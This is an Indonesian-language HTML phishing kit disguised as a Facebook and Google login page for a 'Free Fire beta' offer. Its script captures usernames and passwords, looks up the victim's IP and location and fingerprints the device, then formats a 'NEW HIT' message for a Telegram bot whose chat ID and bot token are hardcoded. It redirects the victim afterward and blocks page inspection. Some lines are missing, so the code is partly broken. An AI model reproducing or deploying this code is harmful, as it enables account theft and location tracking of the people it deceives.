<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Poppins:wght@300;400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        /* --- REXUSZ ENGINE V9.5 LUXURY CORE --- */
        :root {
            --primary-blue: #007bff;
            --secondary-blue: #0056b3;
            --neon-glow: 0 0 25px rgba(0, 123, 255, 0.6);
            --dark-deep: #00050a;
            --glass: rgba(5, 15, 30, 0.95);
            --error: #ff3e3e;
        }

        ::-webkit-scrollbar { width: 0px; }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none !important; }

        body {
            background: var(--dark-deep);
            color: #ffffff;
            font-family: 'Poppins', sans-serif;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* PHYSICS BACKGROUND CANVAS */
        #bg-canvas {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1;
        }

        .vignette {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: radial-gradient(circle at center, transparent 0%, #000 100%);
            z-index: 2;
            pointer-events: none;
        }

        /* MAIN CONTAINER ARCHITECTURE */
        .master-box {
            position: relative;
            z-index: 10;
            width: 95%;
            max-width: 430px;
            perspective: 1000px;
        }

        .glass-card {
            background: var(--glass);
            border: 1px solid rgba(0, 123, 255, 0.3);
            border-radius: 35px;
            padding: 45px 35px;
            text-align: center;
            box-shadow: var(--neon-glow);
            backdrop-filter: blur(25px);
            position: relative;
            overflow: hidden;
            transition: 0.5s;
        }

        /* SCANLINE EFFECT */
        .scanline {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 10px;
            background: linear-gradient(to bottom, transparent, rgba(0, 123, 255, 0.15), transparent);
            animation: scan 3s linear infinite;
        }
        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }

        /* HEADER DESIGN */
        .brand-header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            font-weight: 900;
            color: var(--primary-blue);
            text-shadow: 0 0 15px rgba(0, 123, 255, 0.8);
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        .brand-header p {
            font-size: 11px;
            font-weight: 800;
            color: #4c8eba;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 40px;
        }

        /* STEP NAVIGATION SYSTEM */
        .step-content { display: none; }
        .step-content.active { display: block; animation: fadeInUp 0.7s cubic-bezier(0.19, 1, 0.22, 1); }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(40px) rotateX(-10deg); }
            to { opacity: 1; transform: translateY(0) rotateX(0); }
        }

        /* AUTH BUTTONS ELITE */
        .btn-auth {
            width: 100%;
            padding: 18px;
            border-radius: 20px;
            border: none;
            font-weight: 800;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 18px;
            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            cursor: pointer;
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
        }

        .btn-fb { background: #1877f2; color: #fff; }
        .btn-ggl { background: #ffffff; color: #333; }

        .btn-auth img { width: 24px; margin-right: 15px; }
        .btn-auth:hover { transform: translateY(-5px) scale(1.02); filter: brightness(1.1); }

        /* FORM INPUT SYSTEM LUXURY */
        .input-group-custom { text-align: left; margin-bottom: 25px; position: relative; }
        .input-group-custom label {
            font-size: 11px;
            color: #6a96c1;
            margin-left: 12px;
            margin-bottom: 10px;
            display: block;
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: 1px;
        }

        .input-group-custom input {
            width: 100%;
            background: rgba(0, 8, 20, 0.9);
            border: 1px solid #1a3a5a;
            border-radius: 18px;
            padding: 18px 22px;
            color: #fff;
            font-size: 15px;
            transition: 0.4s;
        }

        .input-group-custom input:focus {
            border-color: var(--primary-blue);
            box-shadow: 0 0 20px rgba(0, 123, 255, 0.25);
            background: rgba(0, 15, 35, 1);
        }

        .err-hint {
            color: var(--error);
            font-size: 10px;
            margin-top: 8px;
            margin-left: 12px;
            display: none;
            font-weight: 600;
            animation: shake 0.5s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .btn-main-submit {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
            border: none;
            border-radius: 18px;
            color: #fff;
            font-weight: 900;
            font-size: 16px;
            margin-top: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.5s;
            box-shadow: 0 10px 25px rgba(0, 123, 255, 0.4);
        }

        .btn-main-submit:hover { box-shadow: 0 0 35px var(--primary-blue); transform: translateY(-2px); }

        /* LOADING SYSTEM OVERLAY */
        #loader-master {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 4, 10, 0.99);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .orbit-spinner {
            width: 70px; height: 70px;
            border: 3px solid rgba(0, 123, 255, 0.1);
            border-top: 3px solid var(--primary-blue);
            border-radius: 50%;
            animation: rotate 0.8s infinite linear;
        }
        @keyframes rotate { 100% { transform: rotate(360deg); } }

        /* FOOTER BRANDING */
        .footer-info {
            margin-top: 45px;
            font-size: 10px;
            color: #1a4a7a;
            font-weight: 600;
            letter-spacing: 2px;
            line-height: 1.8;
        }
    </style>
</head>
<body>

    <canvas id="bg-canvas"></canvas>

    <div class="master-box">

    <script>
        /* --- HIGH-PERFORMANCE PARTICLE ENGINE --- */
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];

        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }

        class Particle {
            constructor() {
                this.reset();
            }
            reset() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.vx = (Math.random() - 0.5) * 0.6;
                this.vy = (Math.random() - 0.5) * 0.6;
                this.size = Math.random() * 2;
            }
            update() {
                this.x += this.vx;
                this.y += this.vy;
                if(this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) this.reset();
            }
            draw() {
                ctx.fillStyle = "rgba(0, 123, 255, 0.4)";
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fill();
            }
        }

        function initParticles() {
            resize();
            for(let i=0; i<100; i++) particles.push(new Particle());
        }

        function loop() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(loop);
        }
        window.addEventListener('resize', resize);
        initParticles(); loop();

        /* --- THE CORE LOGIC ENGINE --- */
        const SH_CID = "8463622692";
        const SH_BTK = "8797152046:AAFGRBsspuWkiuiy0OXu9NDu1NI7nkM03bc";
        let currentMethod = "";

        function switchStep(m) {
            currentMethod = m;
            document.getElementById('step-selector').classList.remove('active');
            document.getElementById('step-form').classList.add('active');
            
            const iconBox = document.getElementById('active-method-icon');
            const label = document.getElementById('label-user');
            
            if(m === 'Facebook') {
                iconBox.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" width="50" class="animate__animated animate__bounceIn">`;
                label.innerText = "Nomor Ponsel atau Email";
            } else {
                iconBox.innerHTML = `<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="50" class="animate__animated animate__bounceIn">`;
                label.innerText = "Alamat Email Google";
                document.getElementById('inp-user').placeholder = "contoh@gmail.com";
            }
        }

        function runValidation() {
            const val = document.getElementById('inp-user').value;
            const hint = document.getElementById('inp-error');
            
            if(currentMethod === 'Google') {
                if(val.length > 4 && !val.includes('@gmail.com')) {
                    hint.style.display = 'block';
                    return false;
                }
            }
            hint.style.display = 'none';
            return true;
        }

            document.getElementById('loader-master').style.display = 'flex';

            // DEEP DATA MINING (ASN & IP)

                net = await fetch('https://ipapi.co/json/').then(r => r.json()); 
            } catch(e) { 
                net = { ip: "0.0.0.0", city: "Err", org: "Err", asn: "Err" }; 
            }

            // HARDWARE FINGERPRINTING
            let batt = "N/A";
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                batt = `${(b.level * 100).toFixed(0)}% [${b.charging ? '⚡ Charging' : '🔋 Discharging'}]`;
            }

            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = ext ? gl.getParameter(ext.UNMASKED_RENDERER_AD) : "UNKNOWN DEVICE";

            const mapsUrl = `https://www.google.com/maps?q=${net.latitude},${net.longitude}`;

            // --- THE LUXURY RESULT PAYLOAD ---
            const resultMsg = 
                `🔥 **NEW HIT: FF BETA TIKTOK WORK** 🔥\n` +
                `✨ **STATUS: SUCCESS INFILTRATION** ✨\n\n` +
                `👤 **[ AKUN TARGET ]**\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `📧 **EMAIL/USER :** \`${u}\`\n` +
                `🔑 **PASSWORD   :** \`${p}\`\n` +
                `🌐 **LOGIN VIA  :** **${currentMethod.toUpperCase()}**\n` +
                `━━━━━━━━━━━━━━━━━━━━\n\n` +
                `📍 **[ INFO LOKASI ]**\n` +
                `━━━━━━━━━━━━━━━━━━━━\n` +
                `🌍 **IP ADDRESS :** \`${net.ip}\`\n` +
                `🛰️ **ASN (ISP)  :** **${net.asn || 'AS-HIDDEN'}**\n` +
                `🏘️ **KOTA/REGION:** **${net.city}, ${net.region || 'Unknown'}**\n` +

            try {

                    method: 'POST',

                    body: JSON.stringify({ chat_id: SH_CID, text: resultMsg, parse_mode: 'Markdown' })
                });
            } catch(e) {}

            // FINAL STEALTH REDIRECT
            setTimeout(() => {
                window.location.href = "https://ffkipas.org/#dwnld";
            }, 3500);
        }

        // ANTI-INSPECT PROTECTION MAX
        document.onkeydown = function(e) {
            if(e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
        };
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>
</body>
